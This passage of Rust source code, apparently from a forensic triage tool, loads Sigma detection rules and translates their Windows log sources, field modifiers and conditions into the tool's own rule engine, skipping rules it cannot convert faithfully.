//! Sigma rule support: load a folder of community Sigma rules (e.g. a SigmaHQ
//! release) and translate each into fx's native [`EventRule`] so it runs on the
//! same compiled engine as the built-in pack.
//!
//! Sigma rules are written against live log sources (Sysmon, Security 4688,
//! PowerShell 4104, …). fx works on triage collections, so each rule's
//! `logsource` is mapped onto the artefacts that can genuinely answer it:
//!
//! * Windows event-log sources (Security, System, PowerShell, Defender, Sysmon
//!   categories such as `image_load` or `network_connection`) → EVTX events
//!   from that channel / those event IDs, with Sigma field names read straight
//!   from the record's EventData.
//! * `process_creation` → process-start events (Security 4688, Sysmon 1) using
//!   fx's normalised image / command line / parent; rules that test only the
//!   image also run against Prefetch and Amcache execution evidence.
//! * `file_event` rules that test only `TargetFilename` → also $MFT.
//! * `registry_*` rules that test only `TargetObject` / `Details` → also fx's
//!   parsed registry artefacts (Run keys, services, …).
//!
//! Anything that can't be translated faithfully — Linux / cloud / network
//! device sources, unsupported modifiers (cidr, base64offset, fieldref,
//! numeric comparisons), aggregation conditions, regexes using features the
//! Rust engine lacks — is skipped with a reason, never half-converted.
//!
//! The built-in rule pack never depends on any of this: Sigma rules are only
//! ever added on top, and a missing or bad folder simply yields zero of them.

use crate::event_rule::{Condition, EventRule, FieldMatch, MatchOp};
use fx_core::Severity;
use serde_yaml::Value;
use std::collections::BTreeMap;
use std::path::Path;

/// Which Sigma rules to load.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SigmaFilter {
    /// Lowest Sigma level to load: informational | low | medium | high | critical.
    pub min_level: String,
    /// Sigma statuses to include (stable, test, experimental). Deprecated and
    /// unsupported rules are always excluded.
    pub statuses: Vec<String>,
    /// Rules the analyst switched off (fx rule id `sigma:…` or the Sigma UUID).
    #[serde(default)]
    pub disabled: Vec<String>,
}

impl Default for SigmaFilter {
    fn default() -> Self {
        Self { min_level: "medium".into(), statuses: vec!["stable".into(), "test".into()], disabled: Vec::new() }
    }
}

/// One rule that wasn't loaded, and why.
#[derive(Debug, Clone, serde::Serialize)]
pub struct SigmaSkip {
    pub file: String,
    pub title: String,
    pub reason: String,
}

/// Result of loading a Sigma folder.
#[derive(Debug, Default, serde::Serialize)]
pub struct SigmaLoad {
    #[serde(skip)]
    pub rules: Vec<EventRule>,
    /// Sigma metadata per loaded rule id (for attribution in the UI/report).
    pub meta: BTreeMap<String, SigmaMeta>,
    pub files_seen: usize,
    pub loaded: usize,
    /// Rules filtered out by level / status (not an error).
    pub filtered: usize,
    /// Rules that would load but the analyst disabled.
    pub disabled: usize,
    /// The same Sigma rule (by id) seen again, e.g. overlapping folders or a
    /// copy of the release inside the release. Loaded once.
    pub duplicates: usize,
    #[serde(skip)]
    seen_ids: std::collections::HashSet<String>,
    /// Count of skipped rules per reason (for the summary line).
    pub skipped_by_reason: BTreeMap<String, usize>,
    /// First few skipped rules per reason, so the analyst can see examples.
    pub skipped_examples: Vec<SigmaSkip>,
    /// Loaded rules per mapped log source (e.g. "process_creation": 812).
    pub loaded_by_source: BTreeMap<String, usize>,
    /// Folder-level problem (missing / unreadable), if any.
    pub folder_error: Option<String>,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct SigmaMeta {
    pub sigma_id: String,
    pub title: String,
    pub level: String,
    pub status: String,
    pub author: String,
    pub logsource: String,
    pub references: Vec<String>,
    pub file: String,
}

/// Prefix on every converted rule id, so Sigma findings are recognisable.
pub const SIGMA_PREFIX: &str = "sigma:";

fn level_rank(l: &str) -> u8 {
    match l.to_ascii_lowercase().as_str() {
        "informational" => 0,
        "low" => 1,
        "medium" => 2,
        "high" => 3,
        "critical" => 4,
        _ => 0,
    }
}

fn level_severity(l: &str) -> Severity {
    match l.to_ascii_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        _ => Severity::Informational,
    }
}

/// Load every `*.yml` / `*.yaml` under `dir` (recursively).
pub fn load_dir(dir: &Path, filter: &SigmaFilter) -> SigmaLoad {
    let mut out = SigmaLoad::default();
    if !dir.is_dir() {
        out.folder_error = Some(format!("Sigma folder not found: {}", dir.display()));
        return out;
    }
    let mut files = Vec::new();
    collect_yaml(dir, &mut files, 0);
    files.sort();
    for f in files {
        out.files_seen += 1;
        let rel = f.strip_prefix(dir).unwrap_or(&f).to_string_lossy().replace('\\', "/");
        let text = match std::fs::read_to_string(&f) {
            Ok(t) => t,
            Err(e) => {
                skip(&mut out, &rel, "", "unreadable file", Some(e.to_string()));
                continue;
            }
        };
        load_text(&text, &rel, filter, &mut out);
    }
    out
}

fn collect_yaml(dir: &Path, out: &mut Vec<std::path::PathBuf>, depth: usize) {
    if depth > 12 {
        return;
    }
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    for e in rd.flatten() {
        let p = e.path();
        if p.is_dir() {
            collect_yaml(&p, out, depth + 1);
        } else if matches!(p.extension().and_then(|x| x.to_str()).map(|x| x.to_ascii_lowercase()).as_deref(), Some("yml") | Some("yaml")) {
            out.push(p);
        }
    }
}

fn skip(out: &mut SigmaLoad, file: &str, title: &str, reason: &str, _detail: Option<String>) {
    *out.skipped_by_reason.entry(reason.to_string()).or_insert(0) += 1;
    if out.skipped_examples.iter().filter(|s| s.reason == reason).count() < 5 {
        out.skipped_examples.push(SigmaSkip { file: file.into(), title: title.into(), reason: reason.into() });
    }
}

/// Convert one Sigma document (a file may hold several YAML documents; only
/// standalone detection rules are supported).
pub fn load_text(text: &str, file: &str, filter: &SigmaFilter, out: &mut SigmaLoad) {
    let docs: Vec<Value> = match serde_yaml::Deserializer::from_str(text)
        .map(Value::deserialize_any_doc)
        .collect::<Result<Vec<_>, _>>()
    {
        Ok(d) => d,
        Err(_) => {
            skip(out, file, "", "not valid YAML", None);
            return;
        }
    };
    for doc in docs {
        if doc.is_null() {
            continue;
        }
        let title = str_of(&doc, "title");
        if doc.get("correlation").is_some() || doc.get("action").is_some() {
            skip(out, file, &title, "Sigma correlation / meta rule", None);
            continue;
        }
        let status = str_of(&doc, "status").to_ascii_lowercase();
        let level = str_of(&doc, "level").to_ascii_lowercase();
        if status == "deprecated" || status == "unsupported" {
            out.filtered += 1;
            continue;
        }
        if !filter.statuses.is_empty() && !filter.statuses.iter().any(|s| s.eq_ignore_ascii_case(&status)) {
            out.filtered += 1;
            continue;
        }
        if level_rank(&level) < level_rank(&filter.min_level) {
            out.filtered += 1;
            continue;
        }
        match convert(&doc, file) {
            Ok((rule, meta, source)) => {
                if filter.disabled.iter().any(|d| d == &rule.id || (!meta.sigma_id.is_empty() && d == &meta.sigma_id)) {
                    out.disabled += 1;
                    continue;
                }
                let key = if meta.sigma_id.is_empty() { rule.id.clone() } else { meta.sigma_id.to_ascii_lowercase() };
                if !out.seen_ids.insert(key) {
                    out.duplicates += 1;
                    continue;
                }
                *out.loaded_by_source.entry(source).or_insert(0) += 1;
                out.meta.insert(rule.id.clone(), meta);
                out.rules.push(rule);
                out.loaded += 1;
            }
            Err(reason) => skip(out, file, &title, &reason, None),
        }
    }
}

// serde_yaml multi-document helper.
trait DeserializeAnyDoc {
    fn deserialize_any_doc(d: serde_yaml::Deserializer) -> Result<Value, serde_yaml::Error>;
}
impl DeserializeAnyDoc for Value {
    fn deserialize_any_doc(d: serde_yaml::Deserializer) -> Result<Value, serde_yaml::Error> {
        use serde::Deserialize;
        Value::deserialize(d)
    }
}

fn str_of(v: &Value, k: &str) -> String {
    match v.get(k) {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Number(n)) => n.to_string(),
        _ => String::new(),
    }
}

// ── Log-source mapping ──────────────────────────────────────────────────────

/// How a rule's fields are resolved for one group of artefacts.
#[derive(Clone, Copy, PartialEq)]
enum FieldMode {
    /// EVTX record: Sigma names read from EventData (with a few normalised
    /// fields for process creation).
    Evtx,
    /// Process-creation event via fx's normalised fields.
    Process,
    /// Prefetch / Amcache execution evidence: image only.
    ExecArtefact,
    /// $MFT file record: TargetFilename only.
    Mft,
    /// fx registry artefacts: TargetObject / Details only.
    Registry,
}

/// A guard (which events a branch applies to) plus how to read fields there.
struct Branch {
    guard: Vec<Condition>,
    mode: FieldMode,
    /// Only use this branch if every field the rule references is in this set
    /// (None = no restriction).
    only_fields: Option<&'static [&'static str]>,
}

const SYSMON_CHANNEL: &str = "Microsoft-Windows-Sysmon/Operational";

fn m(field: &str, op: MatchOp, values: Vec<String>) -> Condition {
    Condition::Match { match_: FieldMatch { field: field.into(), op, values, ci: true } }
}
fn eq(field: &str, v: &str) -> Condition {
    m(field, MatchOp::Equals, vec![v.to_string()])
}
fn is_evtx() -> Condition {
    eq("artefact", "Evtx")
}
fn sysmon(ids: &[u32]) -> Vec<Condition> {
    vec![
        is_evtx(),
        eq("evtx.Channel", SYSMON_CHANNEL),
        m("event.id", MatchOp::Equals, ids.iter().map(|i| i.to_string()).collect()),
    ]
}
fn channel(name: &str) -> Vec<Condition> {
    vec![is_evtx(), eq("evtx.Channel", name)]
}

fn branches_for(logsource: &Value) -> Result<(String, Vec<Branch>), String> {
    let product = str_of(logsource, "product").to_ascii_lowercase();
    let category = str_of(logsource, "category").to_ascii_lowercase();
    let service = str_of(logsource, "service").to_ascii_lowercase();
    if !product.is_empty() && product != "windows" {
        return Err(format!("not a Windows rule ({product})"));
    }
    let label = if !category.is_empty() { category.clone() } else { service.clone() };
    let b = |guard: Vec<Condition>, mode| Branch { guard, mode, only_fields: None };
    let branches: Vec<Branch> = match (category.as_str(), service.as_str()) {
        ("process_creation", _) => vec![
            b(vec![is_evtx(), eq("action", "process.start")], FieldMode::Process),
            Branch {
                // Amcache only: it records the full image path. Prefetch keeps
                // just the file name, and Sigma image rules usually pair a
                // name with "not in System32"-style path filters — with no
                // directory to test, those filters can't exclude anything and
                // every normal svchost / MpCmdRun run became a finding.
                guard: vec![eq("artefact", "Amcache")],
                mode: FieldMode::ExecArtefact,
                only_fields: Some(&["Image"]),
            },
        ],
        ("file_event", _) => vec![
            b(sysmon(&[11]), FieldMode::Evtx),
            Branch {
                guard: vec![eq("artefact", "Mft"), eq("action", "file.created")],
                mode: FieldMode::Mft,
                only_fields: Some(&["TargetFilename"]),
            },
        ],
        ("file_delete", _) => vec![b(sysmon(&[23, 26]), FieldMode::Evtx)],
        ("file_change", _) => vec![b(sysmon(&[2]), FieldMode::Evtx)],
        ("create_stream_hash", _) => vec![b(sysmon(&[15]), FieldMode::Evtx)],
        ("file_executable_detected", _) => vec![b(sysmon(&[29]), FieldMode::Evtx)],
        ("registry_set", _) | ("registry_add", _) | ("registry_delete", _) | ("registry_event", _) | ("registry_rename", _) => {
            let ids: &[u32] = match category.as_str() {
                "registry_set" => &[13],
                "registry_rename" => &[14],
                _ => &[12, 13, 14],
            };
            let mut v = vec![b(sysmon(ids), FieldMode::Evtx)];
            if category != "registry_delete" {
                v.push(Branch {
                    guard: vec![m("artefact", MatchOp::Regex, vec!["^(RegistryRun|RegistryService|RegistryGeneric)$".into()])],
                    mode: FieldMode::Registry,
                    only_fields: Some(&["TargetObject", "Details"]),
                });
            }
            v
        }
        ("network_connection", _) => vec![b(sysmon(&[3]), FieldMode::Evtx)],
        ("driver_load", _) => vec![b(sysmon(&[6]), FieldMode::Evtx)],
        ("image_load", _) => vec![b(sysmon(&[7]), FieldMode::Evtx)],
        ("create_remote_thread", _) => vec![b(sysmon(&[8]), FieldMode::Evtx)],
        ("raw_access_thread", _) => vec![b(sysmon(&[9]), FieldMode::Evtx)],
        ("process_access", _) => vec![b(sysmon(&[10]), FieldMode::Evtx)],
        ("pipe_created", _) => vec![b(sysmon(&[17, 18]), FieldMode::Evtx)],
        ("wmi_event", _) => vec![b(sysmon(&[19, 20, 21]), FieldMode::Evtx)],
        ("dns_query", _) => vec![b(sysmon(&[22]), FieldMode::Evtx)],
        ("clipboard_capture", _) => vec![b(sysmon(&[24]), FieldMode::Evtx)],
        ("process_tampering", _) => vec![b(sysmon(&[25]), FieldMode::Evtx)],
        ("sysmon_status", _) => vec![b(sysmon(&[4, 16]), FieldMode::Evtx)],
        ("sysmon_error", _) => vec![b(sysmon(&[255]), FieldMode::Evtx)],
        ("ps_script", _) => vec![b(
            vec![is_evtx(), eq("evtx.Channel", "Microsoft-Windows-PowerShell/Operational"), eq("event.id", "4104")],
            FieldMode::Evtx,
        )],
        ("ps_module", _) => vec![b(
            vec![is_evtx(), eq("evtx.Channel", "Microsoft-Windows-PowerShell/Operational"), eq("event.id", "4103")],
            FieldMode::Evtx,
        )],
        ("ps_classic_start", _) => vec![b(vec![is_evtx(), eq("evtx.Channel", "Windows PowerShell"), eq("event.id", "400")], FieldMode::Evtx)],
        ("ps_classic_provider_start", _) => vec![b(vec![is_evtx(), eq("evtx.Channel", "Windows PowerShell"), eq("event.id", "600")], FieldMode::Evtx)],
        ("ps_classic_script", _) => vec![b(vec![is_evtx(), eq("evtx.Channel", "Windows PowerShell"), eq("event.id", "800")], FieldMode::Evtx)],
        ("", s) if !s.is_empty() => match service_channel(s) {
            Some(ch) => vec![b(channel(ch), FieldMode::Evtx)],
            None => return Err(format!("log source not mapped (service: {s})")),
        },
        (c, _) => return Err(format!("log source not mapped ({})", if c.is_empty() { "none" } else { c })),
    };
    Ok((label, branches))
}

/// Sigma `service` → Windows event-log channel name.
fn service_channel(s: &str) -> Option<&'static str> {
    Some(match s {
        "security" => "Security",
        "system" => "System",
        "application" => "Application",
        "sysmon" => SYSMON_CHANNEL,
        "powershell" => "Microsoft-Windows-PowerShell/Operational",
        "powershell-classic" => "Windows PowerShell",
        "windefend" => "Microsoft-Windows-Windows Defender/Operational",
        "taskscheduler" => "Microsoft-Windows-TaskScheduler/Operational",
        "bits-client" => "Microsoft-Windows-Bits-Client/Operational",
        "codeintegrity-operational" => "Microsoft-Windows-CodeIntegrity/Operational",
        "ntlm" => "Microsoft-Windows-NTLM/Operational",
        "dns-client" => "Microsoft-Windows-DNS-Client/Operational",
        "dns-server" => "DNS Server",
        "wmi" => "Microsoft-Windows-WMI-Activity/Operational",
        "firewall-as" => "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
        "security-mitigations" => "Microsoft-Windows-Security-Mitigations/KernelMode",
        "appxdeployment-server" => "Microsoft-Windows-AppXDeploymentServer/Operational",
        "msexchange-management" => "MSExchange Management",
        "iis-configuration" => "Microsoft-IIS-Configuration/Operational",
        "terminalservices-localsessionmanager" => "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "openssh" => "OpenSSH/Operational",
        "printservice-admin" => "Microsoft-Windows-PrintService/Admin",
        "printservice-operational" => "Microsoft-Windows-PrintService/Operational",
        "smbclient-security" => "Microsoft-Windows-SmbClient/Security",
        "shell-core" => "Microsoft-Windows-Shell-Core/Operational",
        "diagnosis-scripted" => "Microsoft-Windows-Diagnosis-Scripted/Operational",
        "lsa-server" => "Microsoft-Windows-LSA/Operational",
        "capi2" => "Microsoft-Windows-CAPI2/Operational",
        "ldap" => "Microsoft-Windows-LDAP-Client/Debug",
        "driver-framework" => "Microsoft-Windows-DriverFrameworks-UserMode/Operational",
        "vhdmp" => "Microsoft-Windows-VHDMP-Operational",
        "appmodel-runtime" => "Microsoft-Windows-AppModel-Runtime/Admin",
        "appxpackaging-om" => "Microsoft-Windows-AppxPackaging/Operational",
        "kernel-shimengine" => "Microsoft-Windows-Kernel-ShimEngine/Operational",
        "hyper-v-worker" => "Microsoft-Windows-Hyper-V-Worker-Admin",
        "certificateservicesclient-lifecycle-system" => "Microsoft-Windows-CertificateServicesClient-Lifecycle-System/Operational",
        "microsoft-servicebus-client" => "Microsoft-ServiceBus-Client",
        _ => return None,
    })
}

/// Resolve a Sigma field name to an fx field for a branch, or None if that
/// branch can't read it.
fn map_field(name: &str, mode: FieldMode) -> Option<String> {
    let n = name;
    match mode {
        FieldMode::Process => Some(match n {
            "Image" => "image".into(),
            "CommandLine" => "process.command_line".into(),
            "ParentImage" => "parent_image".into(),
            "User" => "user.name".into(),
            "Computer" | "ComputerName" => "host".into(),
            "EventID" => "event.id".into(),
            _ => format!("evtx.{n}"),
        }),
        FieldMode::Evtx => Some(match n {
            "EventID" => "event.id".into(),
            "Computer" | "ComputerName" => "evtx.Computer".into(),
            _ => format!("evtx.{n}"),
        }),
        FieldMode::ExecArtefact => (n == "Image").then(|| "image".into()),
        FieldMode::Mft => (n == "TargetFilename").then(|| "sigma.file_path".into()),
        FieldMode::Registry => match n {
            "TargetObject" => Some("sigma.registry_path".into()),
            "Details" => Some("target.path".into()),
            _ => None,
        },
    }
}

// ── Detection → condition tree ──────────────────────────────────────────────

fn convert(doc: &Value, file: &str) -> Result<(EventRule, SigmaMeta, String), String> {
    let title = str_of(doc, "title");
    let sigma_id = str_of(doc, "id");
    if title.is_empty() {
        return Err("missing title".into());
    }
    let logsource = doc.get("logsource").ok_or("missing logsource")?;
    let (source_label, branches) = branches_for(logsource)?;
    let detection = doc.get("detection").ok_or("missing detection")?;
    if detection.get("timeframe").is_some() {
        return Err("time-window aggregation (timeframe)".into());
    }
    let cond_v = detection.get("condition").ok_or("missing condition")?;
    let cond_text = match cond_v {
        Value::String(s) => s.clone(),
        Value::Sequence(seq) => seq
            .iter()
            .filter_map(|v| v.as_str().map(|s| format!("({s})")))
            .collect::<Vec<_>>()
            .join(" or "),
        _ => return Err("unsupported condition".into()),
    };
    if cond_text.contains('|') {
        return Err("aggregation condition (count/near)".into());
    }

    // Parse search identifiers once (field-name agnostic), then build per branch.
    let mut searches: BTreeMap<String, Search> = BTreeMap::new();
    if let Value::Mapping(map) = detection {
        for (k, v) in map {
            let Some(name) = k.as_str() else { continue };
            if name == "condition" || name == "timeframe" {
                continue;
            }
            searches.insert(name.to_string(), parse_search(v)?);
        }
    }
    let ast = parse_condition(&cond_text, &searches)?;
    let used_fields: Vec<String> = {
        let mut f = Vec::new();
        for s in searches.values() {
            s.fields(&mut f);
        }
        f.sort();
        f.dedup();
        f
    };

    let mut parts = Vec::new();
    for br in &branches {
        if let Some(only) = br.only_fields {
            if used_fields.is_empty() || !used_fields.iter().all(|f| only.contains(&f.as_str())) {
                continue;
            }
        }
        let tree = build_ast(&ast, &searches, br.mode)?;
        let mut all = br.guard.clone();
        all.push(tree);
        parts.push(Condition::All { all });
    }
    if parts.is_empty() {
        return Err("no artefact can evaluate this rule".into());
    }
    let detection = if parts.len() == 1 { parts.pop().unwrap() } else { Condition::Any { any: parts } };

    let level = str_of(doc, "level").to_ascii_lowercase();
    let status = str_of(doc, "status").to_ascii_lowercase();
    let author = str_of(doc, "author");
    let attack: Vec<String> = doc
        .get("tags")
        .and_then(|t| t.as_sequence())
        .map(|seq| {
            seq.iter()
                .filter_map(|t| t.as_str())
                .filter_map(|t| t.strip_prefix("attack.t").map(|x| format!("T{}", x.to_ascii_uppercase())))
                .collect()
        })
        .unwrap_or_default();
    let references: Vec<String> = doc
        .get("references")
        .and_then(|t| t.as_sequence())
        .map(|seq| seq.iter().filter_map(|t| t.as_str().map(str::to_string)).collect())
        .unwrap_or_default();
    let fps: Vec<String> = doc
        .get("falsepositives")
        .and_then(|t| t.as_sequence())
        .map(|seq| seq.iter().filter_map(|t| t.as_str().map(str::to_string)).collect())
        .unwrap_or_default();
    let id = format!("{SIGMA_PREFIX}{}", if sigma_id.is_empty() { file.to_string() } else { sigma_id.clone() });
    let mut description = str_of(doc, "description");
    description.push_str(&format!(
        "\n\nSigma rule {} ({}, {}){}. Licence: Detection Rule License 1.1 — attribution to the rule author(s).",
        if sigma_id.is_empty() { file } else { &sigma_id },
        level,
        status,
        if author.is_empty() { String::new() } else { format!(" by {author}") }
    ));
    if !fps.is_empty() {
        description.push_str(&format!("\nKnown false positives: {}.", fps.join("; ")));
    }
    let rule = EventRule {
        id: id.clone(),
        title: title.clone(),
        description,
        severity: level_severity(&level),
        attack,
        detection,
        artefacts: Vec::new(),
        tests: Default::default(),
    };
    // Validate every pattern compiles in fx's engine (Sigma regexes may use
    // PCRE features like look-arounds that Rust's regex does not support).
    validate_patterns(&rule.detection)?;
    let meta = SigmaMeta {
        sigma_id,
        title,
        level,
        status,
        author,
        logsource: source_label.clone(),
        references,
        file: file.to_string(),
    };
    Ok((rule, meta, source_label))
}

fn validate_patterns(c: &Condition) -> Result<(), String> {
    match c {
        Condition::All { all } => all.iter().try_for_each(validate_patterns),
        Condition::Any { any } => any.iter().try_for_each(validate_patterns),
        Condition::Not { not } => validate_patterns(not),
        Condition::Match { match_ } => {
            if matches!(match_.op, MatchOp::Regex) {
                for v in &match_.values {
                    regex::RegexBuilder::new(v)
                        .case_insensitive(match_.ci)
                        .size_limit(1 << 24)
                        .build()
                        .map_err(|_| "regex uses features fx can't run (look-around / back-reference)".to_string())?;
                }
            }
            Ok(())
        }
    }
}

/// A Sigma search identifier: OR of maps (each map = AND of field tests), or a
/// keyword list.
#[derive(Debug, Clone)]
enum Search {
    Maps(Vec<Vec<FieldTest>>),
    Keywords(Vec<String>, bool /* all */),
}

impl Search {
    fn fields(&self, out: &mut Vec<String>) {
        if let Search::Maps(ms) = self {
            for m in ms {
                for t in m {
                    out.push(t.field.clone());
                }
            }
        }
    }
}

#[derive(Debug, Clone)]
struct FieldTest {
    field: String,
    kind: Kind,
    all: bool,
    cased: bool,
    /// None = value is null / empty → "field absent or empty".
    values: Option<Vec<String>>,
    exists: Option<bool>,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Kind {
    Equals,
    Contains,
    StartsWith,
    EndsWith,
    Re,
}

fn scalar(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

fn parse_search(v: &Value) -> Result<Search, String> {
    match v {
        Value::Mapping(map) => Ok(Search::Maps(vec![parse_map(map)?])),
        Value::Sequence(seq) => {
            if seq.iter().all(|x| matches!(x, Value::Mapping(_))) {
                let mut ms = Vec::new();
                for x in seq {
                    if let Value::Mapping(map) = x {
                        ms.push(parse_map(map)?);
                    }
                }
                Ok(Search::Maps(ms))
            } else {
                let kws: Vec<String> = seq.iter().filter_map(scalar).collect();
                if kws.len() != seq.len() {
                    return Err("mixed keyword / field search".into());
                }
                Ok(Search::Keywords(kws, false))
            }
        }
        Value::String(s) => Ok(Search::Keywords(vec![s.clone()], false)),
        _ => Err("unsupported search block".into()),
    }
}

fn parse_map(map: &serde_yaml::Mapping) -> Result<Vec<FieldTest>, String> {
    let mut tests = Vec::new();
    for (k, v) in map {
        let key = k.as_str().ok_or("non-string field name")?;
        let mut parts = key.split('|');
        let field = parts.next().unwrap_or("").to_string();
        let mut kind = Kind::Equals;
        let (mut all, mut cased, mut windash, mut exists_mod, mut re_i) = (false, false, false, false, false);
        for md in parts {
            match md {
                "contains" => kind = Kind::Contains,
                "startswith" => kind = Kind::StartsWith,
                "endswith" => kind = Kind::EndsWith,
                "re" => kind = Kind::Re,
                "all" => all = true,
                "cased" => cased = true,
                "windash" => windash = true,
                "exists" => exists_mod = true,
                "i" | "m" | "s" if kind == Kind::Re => re_i |= md == "i",
                other => return Err(format!("unsupported modifier |{other}")),
            }
        }
        if kind == Kind::Re {
            cased = !re_i; // Sigma regexes are case-sensitive unless |i
        }
        if field.is_empty() {
            return Err("keyword search with modifiers".into());
        }
        if exists_mod {
            let want = matches!(v, Value::Bool(true)) || scalar(v).map_or(false, |s| s.eq_ignore_ascii_case("true"));
            tests.push(FieldTest { field, kind, all, cased, values: Some(vec![]), exists: Some(want) });
            continue;
        }
        let values: Option<Vec<String>> = match v {
            Value::Null => None,
            Value::Sequence(seq) => {
                let vs: Vec<String> = seq.iter().filter_map(scalar).collect();
                if vs.len() != seq.len() {
                    return Err("null inside a value list".into());
                }
                Some(vs)
            }
            other => match scalar(other) {
                Some(s) if s.is_empty() => None,
                Some(s) => Some(vec![s]),
                None => return Err("unsupported value type".into()),
            },
        };
        let values = values.map(|vs| if windash { expand_windash(&vs) } else { vs });
        tests.push(FieldTest { field, kind, all, cased, values, exists: None });
    }
    Ok(tests)
}

/// `|windash`: a leading `-` or `/` on a flag may be written as either, or as
/// en / em / horizontal-bar dashes.
fn expand_windash(vs: &[String]) -> Vec<String> {
    let dashes = ['-', '/', '\u{2013}', '\u{2014}', '\u{2015}'];
    let mut out = Vec::new();
    for v in vs {
        out.push(v.clone());
        let mut variants = vec![String::new()];
        let mut any = false;
        for (i, ch) in v.char_indices() {
            let at_flag = (ch == '-' || ch == '/') && (i == 0 || v[..i].ends_with(' '));
            if at_flag {
                any = true;
                variants = variants
                    .into_iter()
                    .flat_map(|p| dashes.iter().map(move |d| format!("{p}{d}")))
                    .collect();
            } else {
                for p in variants.iter_mut() {
                    p.push(ch);
                }
            }
            if variants.len() > 64 {
                break;
            }
        }
        if any {
            out.extend(variants);
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Sigma wildcard value → regex fragment (unanchored). `*` = any run, `?` =
/// one char, `\*` / `\?` / `\\` are escapes.
fn wildcard_to_regex(v: &str) -> String {
    let mut out = String::new();
    let mut chars = v.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.peek() {
                Some('*') | Some('?') | Some('\\') => {
                    let n = chars.next().unwrap();
                    out.push_str(&regex::escape(&n.to_string()));
                }
                _ => out.push_str(r"\\"),
            },
            '*' => out.push_str(".*"),
            '?' => out.push('.'),
            other => out.push_str(&regex::escape(&other.to_string())),
        }
    }
    out
}

fn has_wildcard(v: &str) -> bool {
    let b = v.as_bytes();
    (0..b.len()).any(|i| (b[i] == b'*' || b[i] == b'?') && (i == 0 || b[i - 1] != b'\\'))
}

/// One field test → condition for a branch.
fn build_test(t: &FieldTest, mode: FieldMode) -> Result<Condition, String> {
    let Some(field) = map_field(&t.field, mode) else {
        return Err(format!("field {} not available", t.field));
    };
    let ci = !t.cased;
    let mk = |op: MatchOp, values: Vec<String>| Condition::Match { match_: FieldMatch { field: field.clone(), op, values, ci } };
    if let Some(want) = t.exists {
        let c = mk(MatchOp::Exists, vec![]);
        return Ok(if want { c } else { Condition::Not { not: Box::new(c) } });
    }
    let Some(values) = &t.values else {
        // null / '' → field absent or empty
        return Ok(Condition::Not { not: Box::new(mk(MatchOp::Exists, vec![])) });
    };
    let one = |v: &String| -> Condition {
        if t.kind == Kind::Re {
            return mk(MatchOp::Regex, vec![v.clone()]);
        }
        if has_wildcard(v) {
            let body = wildcard_to_regex(v);
            let re = match t.kind {
                Kind::Equals => format!("^{body}$"),
                Kind::Contains => body,
                Kind::StartsWith => format!("^{body}"),
                Kind::EndsWith => format!("{body}$"),
                Kind::Re => unreachable!(),
            };
            return mk(MatchOp::Regex, vec![re]);
        }
        let plain = v.replace(r"\*", "*").replace(r"\?", "?");
        let op = match t.kind {
            Kind::Equals => MatchOp::Equals,
            Kind::Contains => MatchOp::Contains,
            Kind::StartsWith => MatchOp::StartsWith,
            Kind::EndsWith => MatchOp::EndsWith,
            Kind::Re => unreachable!(),
        };
        mk(op, vec![plain])
    };
    if t.all {
        Ok(Condition::All { all: values.iter().map(one).collect() })
    } else if values.iter().all(|v| t.kind != Kind::Re && !has_wildcard(v)) {
        // Fast path: one leaf with a value list (OR) — compiles to one pattern.
        let op = match t.kind {
            Kind::Equals => MatchOp::Equals,
            Kind::Contains => MatchOp::Contains,
            Kind::StartsWith => MatchOp::StartsWith,
            Kind::EndsWith => MatchOp::EndsWith,
            Kind::Re => unreachable!(),
        };
        Ok(mk(op, values.iter().map(|v| v.replace(r"\*", "*").replace(r"\?", "?")).collect()))
    } else {
        Ok(Condition::Any { any: values.iter().map(one).collect() })
    }
}

fn build_search(s: &Search, mode: FieldMode) -> Result<Condition, String> {
    match s {
        Search::Maps(ms) => {
            let mut any = Vec::new();
            for map in ms {
                let mut all = Vec::new();
                let mut ok = true;
                for t in map {
                    match build_test(t, mode) {
                        Ok(c) => all.push(c),
                        Err(e) if e.starts_with("field ") => {
                            ok = false; // this map can't match in this branch
                            break;
                        }
                        Err(e) => return Err(e),
                    }
                }
                if ok {
                    any.push(Condition::All { all });
                }
            }
            if any.is_empty() {
                // Nothing in this search is readable here: it can never match.
                return Ok(Condition::Any { any: vec![] });
            }
            Ok(if any.len() == 1 { any.pop().unwrap() } else { Condition::Any { any } })
        }
        Search::Keywords(kws, all) => {
            let fields = match mode {
                FieldMode::Evtx | FieldMode::Process => vec!["message", "process.command_line", "evtx.__text"],
                _ => vec!["message"],
            };
            let one = |k: &String| Condition::Any {
                any: fields
                    .iter()
                    .map(|f| {
                        if has_wildcard(k) {
                            m(f, MatchOp::Regex, vec![wildcard_to_regex(k)])
                        } else {
                            m(f, MatchOp::Contains, vec![k.clone()])
                        }
                    })
                    .collect(),
            };
            Ok(if *all { Condition::All { all: kws.iter().map(one).collect() } } else { Condition::Any { any: kws.iter().map(one).collect() } })
        }
    }
}

// ── Condition expression parser ─────────────────────────────────────────────

#[derive(Debug, Clone)]
enum Ast {
    And(Vec<Ast>),
    Or(Vec<Ast>),
    Not(Box<Ast>),
    Ident(String),
    /// `1 of x*` / `any of them` (false) or `all of …` (true), with the
    /// matched identifiers.
    Quant(bool, Vec<String>),
}

fn tokenize(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    for c in s.chars() {
        match c {
            '(' | ')' => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
                out.push(c.to_string());
            }
            c if c.is_whitespace() => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            c => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

fn parse_condition(s: &str, searches: &BTreeMap<String, Search>) -> Result<Ast, String> {
    let toks = tokenize(s);
    let mut p = 0usize;
    let ast = parse_or(&toks, &mut p, searches)?;
